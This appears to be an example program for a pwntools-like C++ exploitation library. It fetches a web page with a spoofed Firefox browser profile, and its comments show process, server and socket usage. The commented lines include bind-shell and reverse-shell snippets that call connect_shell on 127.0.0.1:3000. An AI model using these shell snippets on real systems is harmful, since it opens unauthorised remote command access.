#include <cpppwn.hpp>

#include <print>

int main() {
  using namespace cpppwn;

  HttpConfig config;
  config.verbose = true;
  config.browser_type = BrowserType::Firefox;
  HttpClient client(config);
  auto response = client.get("https://erarnitox.de");

  std::println("Erarnitox Says: \n{}", response.body);

  /*
  Process proc("/bin/bash", {"/bin/bash"});
  proc.sendline("echo 'Hello There!'");
  std::println("Output: {}", proc.recvline());
  proc.interactive();
  */

  /*
  HttpServer server(8080);

  server.get("/", [](const HttpRequest& req) {
      return HttpResponse().set_html("<h1>Hello There!</h1>");
  });

  server.start();
  */
  
  /*
  HttpConfig config;
  config.verbose = true;
  config.browser_type = BrowserType::Firefox;

  HttpClient client(config);
  auto response = client.get("https://erarnitox.de");

  std::println("Github Says: \n{}", response.body);
  */
  
  /*
  constexpr bool is_local = false;
  std::unique_ptr<Stream> conn{ nullptr };
  
  if constexpr (is_local) {
    conn = std::make_unique<Process>("/bin/cat");
  } else {
    conn = std::make_unique<Remote>("127.0.0.1", 3000);
  }

  conn->interactive();
  */

  // Bind Shell example
  // Server server(3000);
  // std::unique_ptr<Stream> client = server.accept();
  // connect_shell(*client);

  // Reverse Shell example
  // Remote conn("127.0.0.1", 3000);
  // connect_shell(conn);

  /*
  while(conn->is_alive()) {
    conn->sendline("Hello, world!");
    std::cout << "Got: " << conn->recvline();
  }*/
}
